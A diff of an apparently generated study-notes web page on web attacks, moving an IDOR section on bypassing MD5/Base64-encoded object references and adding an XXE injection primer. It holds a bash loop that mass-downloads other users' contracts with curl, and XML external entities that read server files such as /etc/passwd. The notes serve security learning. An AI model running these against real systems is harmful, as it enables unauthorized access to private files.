@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-1df47fb7.js";
+            window.path_to_searchindex_js = "searchindex-a0e2973e.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-fac9f2dd.js"></script>
+        <script src="toc-4b57a162.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28163,6 +28163,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#intro-to-idor">Intro to IDOR — what it is, why common, impact (disclosure, modification, privilege escalation), attack pattern</a></li>
 <li><a href="#identifying-idors">Identifying IDORs — URL params, AJAX calls, encoded/hashed references, comparing user roles</a></li>
 <li><a href="#idor--mass-enumeration">IDOR mass enumeration — insecure parameters, static file IDOR, parameter-based IDOR, bulk download scripting</a></li>
+<li><a href="#intro-to-xxe-injection">Intro to XXE — XML structure, DTD, internal/external entities, the external entity file-read primitive</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
@@ -28174,6 +28175,7 @@ $result = $conn-&gt;query($query);
 <p><strong>Identifying IDORs</strong> starts with spotting direct object references in URL parameters (<code>?uid=1</code>), API paths, cookies, or headers, then incrementing/fuzzing values to check for unauthorized access. Front-end JavaScript AJAX calls may reveal hidden endpoints and parameters (including admin functions disabled client-side but present in source). <strong>Encoded</strong> references (Base64) can be decoded, modified, and re-encoded; <strong>hashed</strong> references can often be reproduced by finding the algorithm in front-end source (e.g., <code>CryptoJS.MD5(filename)</code>) or identifying the hash type. Registering <strong>multiple accounts</strong> and comparing their HTTP requests reveals how identifiers are calculated and whether the back-end validates the caller’s session against the requested resource.</p>
 <p><strong>Mass enumeration</strong> automates IDOR exploitation at scale. <strong>Static file IDORs</strong> embed the user ID in predictable filenames (<code>Invoice_1_09_2021.pdf</code>); <strong>parameter-based IDORs</strong> pass the UID directly in a query string (<code>?uid=1</code>) — always check linked file URLs and page source since the UI may look identical across different UIDs. Extract document links with <code>curl</code> + regex (<code>grep -oP "\/documents.*?.pdf"</code>), then loop over UID ranges with a bash script using <code>wget</code>, or use Burp Intruder / ZAP Fuzzer for the same result.</p>
 <p><strong>Bypassing encoded references</strong> exploits the common mistake of performing hashing or encoding client-side. When a web application obscures object references using a scheme like <code>MD5(Base64(uid))</code>, the algorithm is visible to anyone who reads the front-end JavaScript source. Reproducing the scheme on the command line (<code>echo -n 1 | base64 -w 0 | md5sum</code>) confirms the algorithm, after which all object references become calculable and the protection is equivalent to none. A bash loop generates hashes for every target UID and <code>curl -sOJ</code> downloads the associated file in a single script. True security requires the hash to be computed server-side with a secret salt <strong>and</strong> a back-end authorization check — encoding or hashing alone is not access control.</p>
+<p><strong>XXE Injection</strong> targets web applications that parse user-supplied XML (SOAP APIs, web forms, file uploads) using XML parsers that allow external entity resolution. XML documents can define <strong>external entities</strong> via the <code>SYSTEM</code> keyword (<code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code>); when the server parses the document and substitutes entity references in its response, the contents of local files are returned to the attacker. The DTD mechanism (<code>&lt;!DOCTYPE&gt;</code>) is what makes this possible — it allows entities to be defined inline before the parser processes the document body. Understanding the core XML primitives (elements, attributes, entities, DTD declarations) is prerequisite to constructing XXE payloads.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28382,6 +28384,65 @@ if (preg_match($pattern, $_GET["code"])) {
 </table>
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="idor--bypassing-encoded-references"><a class="header" href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References</a></h1>
+<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<p>Some web applications hash or encode object references (e.g., MD5, Base64) instead of exposing sequential integers. This makes enumeration harder but <strong>does not eliminate the IDOR</strong> if there is no back-end access control — an attacker who can reproduce the encoding scheme can still enumerate all objects.</p>
+<h2 id="recognizing-the-pattern"><a class="header" href="#recognizing-the-pattern">Recognizing the pattern</a></h2>
+<p>A POST parameter like:</p>
+<pre><code>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+</code></pre>
+<p>looks like a 32-character MD5 hash. Naively testing <code>md5(uid)</code> may not match if a transformation is applied first.</p>
+<h2 id="function-disclosure--finding-the-algorithm-in-front-end-source"><a class="header" href="#function-disclosure--finding-the-algorithm-in-front-end-source">Function disclosure — finding the algorithm in front-end source</a></h2>
+<p>Modern JavaScript frameworks (Angular, React, Vue.js) often perform hashing client-side. Inspect the page source for the JavaScript that constructs the parameter:</p>
+<pre><code class="language-javascript">function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+</code></pre>
+<p>This reveals the algorithm: <strong>Base64-encode the UID, then MD5-hash the result</strong>.</p>
+<h2 id="verifying-the-algorithm"><a class="header" href="#verifying-the-algorithm">Verifying the algorithm</a></h2>
+<p>Reproduce the hash on the command line, matching the front-end exactly:</p>
+<pre><code class="language-bash"># -n suppresses the trailing newline; -w 0 prevents base64 line-wrapping
+echo -n 1 | base64 -w 0 | md5sum
+# cdd96d3cc73d1dbdaffa03cc6cd7339b
+</code></pre>
+<p>If the output matches the observed parameter value, the algorithm is confirmed and all object references can now be calculated.</p>
+<h2 id="mass-enumeration-via-script"><a class="header" href="#mass-enumeration-via-script">Mass enumeration via script</a></h2>
+<p>Generate hashes and download files for a range of UIDs:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+</code></pre>
+<ul>
+<li><code>tr -d ' -'</code> strips the trailing space and dash added by <code>md5sum</code></li>
+<li><code>-sOJ</code> saves the file using the server-supplied filename (<code>Content-Disposition</code>)</li>
+</ul>
+<p>Running the script downloads contracts for all enumerated employees:</p>
+<pre><code>contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
+contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
+...
+</code></pre>
+<h2 id="key-takeaways-7"><a class="header" href="#key-takeaways-7">Key takeaways</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Factor</th><th>Detail</th></tr>
+</thead>
+<tbody>
+<tr><td>Encoding/hashing</td><td>Obscures references but is <strong>not</strong> access control</td></tr>
+<tr><td>Front-end hashing</td><td>Algorithm is visible to any user who reads page source</td></tr>
+<tr><td>Secure alternative</td><td>Hash server-side with a secret salt <strong>and</strong> enforce back-end authorization</td></tr>
+<tr><td>Tools for blind hashing</td><td>Burp Comparer, Burp Intruder, ZAP Fuzzer — fuzz values and compare hashes</td></tr>
+</tbody>
+</table>
+</div>
+<p>A truly <strong>Secure Direct Object Reference</strong> requires both an unpredictable reference <strong>and</strong> a server-side check that the requesting user is authorized to access it. Either alone is insufficient.</p>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="identifying-idors"><a class="header" href="#identifying-idors">Identifying IDORs</a></h1>
 <h2 id="url-parameters-and-apis"><a class="header" href="#url-parameters-and-apis">URL parameters and APIs</a></h2>
 <p>The first step is spotting <strong>direct object references</strong> in HTTP traffic. Look for:</p>
@@ -28532,65 +28593,6 @@ done
 </code></pre>
 <p>Adjust the UID range based on the target. Alternatives: Burp Intruder (payload positions on the UID parameter) or ZAP Fuzzer for the same effect without scripting.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="idor--bypassing-encoded-references"><a class="header" href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References</a></h1>
-<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
-<p>Some web applications hash or encode object references (e.g., MD5, Base64) instead of exposing sequential integers. This makes enumeration harder but <strong>does not eliminate the IDOR</strong> if there is no back-end access control — an attacker who can reproduce the encoding scheme can still enumerate all objects.</p>
-<h2 id="recognizing-the-pattern"><a class="header" href="#recognizing-the-pattern">Recognizing the pattern</a></h2>
-<p>A POST parameter like:</p>
-<pre><code>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
-</code></pre>
-<p>looks like a 32-character MD5 hash. Naively testing <code>md5(uid)</code> may not match if a transformation is applied first.</p>
-<h2 id="function-disclosure--finding-the-algorithm-in-front-end-source"><a class="header" href="#function-disclosure--finding-the-algorithm-in-front-end-source">Function disclosure — finding the algorithm in front-end source</a></h2>
-<p>Modern JavaScript frameworks (Angular, React, Vue.js) often perform hashing client-side. Inspect the page source for the JavaScript that constructs the parameter:</p>
-<pre><code class="language-javascript">function downloadContract(uid) {
-    $.redirect("/download.php", {
-        contract: CryptoJS.MD5(btoa(uid)).toString(),
-    }, "POST", "_self");
-}
-</code></pre>
-<p>This reveals the algorithm: <strong>Base64-encode the UID, then MD5-hash the result</strong>.</p>
-<h2 id="verifying-the-algorithm"><a class="header" href="#verifying-the-algorithm">Verifying the algorithm</a></h2>
-<p>Reproduce the hash on the command line, matching the front-end exactly:</p>
-<pre><code class="language-bash"># -n suppresses the trailing newline; -w 0 prevents base64 line-wrapping
-echo -n 1 | base64 -w 0 | md5sum
-# cdd96d3cc73d1dbdaffa03cc6cd7339b
-</code></pre>
-<p>If the output matches the observed parameter value, the algorithm is confirmed and all object references can now be calculated.</p>
-<h2 id="mass-enumeration-via-script"><a class="header" href="#mass-enumeration-via-script">Mass enumeration via script</a></h2>
-<p>Generate hashes and download files for a range of UIDs:</p>
-<pre><code class="language-bash">#!/bin/bash
-
-for i in {1..10}; do
-    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
-        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
-    done
-done
-</code></pre>
-<ul>
-<li><code>tr -d ' -'</code> strips the trailing space and dash added by <code>md5sum</code></li>
-<li><code>-sOJ</code> saves the file using the server-supplied filename (<code>Content-Disposition</code>)</li>
-</ul>
-<p>Running the script downloads contracts for all enumerated employees:</p>
-<pre><code>contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
-contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
-...
-</code></pre>
-<h2 id="key-takeaways-7"><a class="header" href="#key-takeaways-7">Key takeaways</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Factor</th><th>Detail</th></tr>
-</thead>
-<tbody>
-<tr><td>Encoding/hashing</td><td>Obscures references but is <strong>not</strong> access control</td></tr>
-<tr><td>Front-end hashing</td><td>Algorithm is visible to any user who reads page source</td></tr>
-<tr><td>Secure alternative</td><td>Hash server-side with a secret salt <strong>and</strong> enforce back-end authorization</td></tr>
-<tr><td>Tools for blind hashing</td><td>Burp Comparer, Burp Intruder, ZAP Fuzzer — fuzz values and compare hashes</td></tr>
-</tbody>
-</table>
-</div>
-<p>A truly <strong>Secure Direct Object Reference</strong> requires both an unpredictable reference <strong>and</strong> a server-side check that the requesting user is authorized to access it. Either alone is insufficient.</p>
-<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="introduction-to-web-attacks"><a class="header" href="#introduction-to-web-attacks">Introduction to Web Attacks</a></h1>
 <h2 id="why-web-attacks-matter"><a class="header" href="#why-web-attacks-matter">Why web attacks matter</a></h2>
 <p>Web applications are the most common attack surface for businesses today. Compromising an external-facing web application can pivot to an internal network, leading to stolen assets or disrupted services. Even organizations with no external web apps typically have internal web apps or external API endpoints, both vulnerable to the same attack classes.</p>
@@ -28611,6 +28613,80 @@ contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
 <li>Enable <strong>Whitebox Penetration Testing</strong> if source code is leaked</li>
 <li><strong>Steal server credentials</strong> and potentially achieve remote code execution by compromising the hosting server</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="intro-to-xxe-injection"><a class="header" href="#intro-to-xxe-injection">Intro to XXE Injection</a></h1>
+<p><strong>XML External Entity (XXE) Injection</strong> occurs when user-controlled XML input is parsed without proper sanitization, allowing an attacker to leverage XML features for malicious actions — from disclosing sensitive server files to shutting down the back-end. Ranked in OWASP’s Top 10.</p>
+<h2 id="xml-primer"><a class="header" href="#xml-primer">XML primer</a></h2>
+<p>XML (Extensible Markup Language) is designed for flexible data storage and transfer, not display. Documents are element trees: one root element, with child elements nested inside.</p>
+<p>Basic example:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;email&gt;
+  &lt;date&gt;01-01-2022&lt;/date&gt;
+  &lt;time&gt;10:00 am UTC&lt;/time&gt;
+  &lt;sender&gt;john@inlanefreight.com&lt;/sender&gt;
+  &lt;recipients&gt;
+    &lt;to&gt;HR@inlanefreight.com&lt;/to&gt;
+    &lt;cc&gt;
+      &lt;to&gt;billing@inlanefreight.com&lt;/to&gt;
+    &lt;/cc&gt;
+  &lt;/recipients&gt;
+  &lt;body&gt;Hello, please share the invoice. Regards, John&lt;/body&gt;
+&lt;/email&gt;
+</code></pre>
+<h3 id="key-xml-terms"><a class="header" href="#key-xml-terms">Key XML terms</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Term</th><th>Definition</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td>Tag</td><td>Keys of an XML document, wrapped with <code>&lt;/&gt;</code></td><td><code>&lt;date&gt;</code></td></tr>
+<tr><td>Entity</td><td>XML variables, wrapped with <code>&amp;/;</code></td><td><code>&amp;lt;</code></td></tr>
+<tr><td>Element</td><td>A tag and its stored value</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr>
+<tr><td>Attribute</td><td>Optional specifications inside a tag</td><td><code>version="1.0"</code></td></tr>
+<tr><td>Declaration</td><td>First line, defines XML version/encoding</td><td><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></td></tr>
+</tbody>
+</table>
+</div>
+<p>Reserved characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>) must be written as entity references (<code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>, <code>&amp;quot;</code>) when used as data. Comments: <code>&lt;!-- comment --&gt;</code>.</p>
+<h2 id="xml-dtd"><a class="header" href="#xml-dtd">XML DTD</a></h2>
+<p>A <strong>Document Type Definition (DTD)</strong> validates an XML document against a pre-defined structure. It can be declared inline or in an external file.</p>
+<p>Inline example:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;
+  &lt;!ELEMENT recipients (to, cc?)&gt;
+  &lt;!ELEMENT date (#PCDATA)&gt;
+  &lt;!ELEMENT sender (#PCDATA)&gt;
+  &lt;!ELEMENT body (#PCDATA)&gt;
+]&gt;
+</code></pre>
+<p>External file reference (using <code>SYSTEM</code>):</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email SYSTEM "email.dtd"&gt;
+</code></pre>
+<p>External URL reference:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd"&gt;
+</code></pre>
+<h2 id="xml-entities"><a class="header" href="#xml-entities">XML entities</a></h2>
+<p>Custom entities (variables) can be defined in a DTD with the <code>ENTITY</code> keyword:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY company "Inlane Freight"&gt;
+]&gt;
+</code></pre>
+<p>Reference with <code>&amp;company;</code> — the parser substitutes the value at parse time.</p>
+<h3 id="external-entities--the-xxe-primitive"><a class="header" href="#external-entities--the-xxe-primitive">External entities — the XXE primitive</a></h3>
+<p>Entities can reference <strong>external files or URLs</strong> via the <code>SYSTEM</code> keyword:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "http://localhost/company.txt"&gt;
+  &lt;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt"&gt;
+]&gt;
+</code></pre>
+<p>When the server parses this XML (e.g., in a SOAP API or web form), it fetches and substitutes the external resource. If the resolved value is returned in the response, an attacker referencing <code>&amp;signature;</code> receives the contents of <code>/var/www/html/signature.txt</code> from the server’s filesystem.</p>
+<p>This is the core mechanism behind XXE: <strong>external entity references that resolve to server-local files are returned to the attacker in the XML response.</strong></p>
+<p>Note: <code>PUBLIC</code> can be used instead of <code>SYSTEM</code> (typically for publicly declared standards), but <code>SYSTEM</code> covers most practical XXE cases.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-active-directory"><a class="header" href="#attacking-active-directory">Attacking Active Directory</a></h1>
 <p>We can attempt to extract credentials from Active Directory (ADDS) using dictionary attacks against AD accounts and dumping hashing from the ntds.dit file.</p>
